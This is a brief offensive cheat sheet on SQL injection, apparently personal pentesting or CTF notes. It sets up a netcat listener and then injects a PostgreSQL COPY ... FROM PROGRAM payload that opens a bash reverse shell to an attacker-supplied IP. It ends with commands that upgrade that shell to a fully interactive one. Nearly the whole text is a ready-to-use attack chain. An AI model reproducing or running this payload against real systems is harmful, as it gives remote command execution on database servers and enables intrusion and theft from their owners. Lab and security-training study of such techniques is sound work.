# SQLi - SQL Injections
﷽
* List of `SQLIs`.

## Where the db name is known (can be exfiltrated through more SQLi :)

* Start a `nc` listener with `nc -lvnp 7777`
* Run `x'; COPY {db-name} FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/{YOUR_IP}/7777 0>&1"' --`, where:
  * `{your-ip}` is your IP, ie. `10.10.16.11`
  * `{db-name}` is a database name, eg. `cars`

* make it fully interactive by

`python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm`

sigma
